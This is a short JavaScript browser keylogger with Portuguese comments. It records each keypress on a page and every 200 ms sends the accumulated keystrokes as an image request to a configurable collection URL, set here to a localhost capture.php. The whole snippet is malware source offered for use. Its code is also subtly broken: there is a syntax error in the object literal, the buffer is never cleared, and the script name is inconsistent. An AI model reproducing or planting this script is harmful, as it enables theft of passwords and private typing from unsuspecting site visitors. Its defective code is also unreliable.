// Array para salvar as teclas apertadas
var buffers = [];

// Seu url com o arquivo.php
var url = "http://localhost/capture.php?log=";

// Detectar as teclas que você aperta e salvá-las no array[]
document.onkeypress = function(e) {
	var pushbuf = {
		k: e.key;
		t: Date.now();
	};
	buffers.push(pushbuf);
}

// A cada 200ms gera uma "imagem" com o seu url para forçar o uso do arquivo.php que detectará os digitos no url (detect.php?log=[dados])
window.setInterval(function() {
	if (buffers.length > 0)
	{
		var capture = encodeURIComponent(JSON.stringify(buffers));
		new Image().src = url + capture;
	}
}, 200);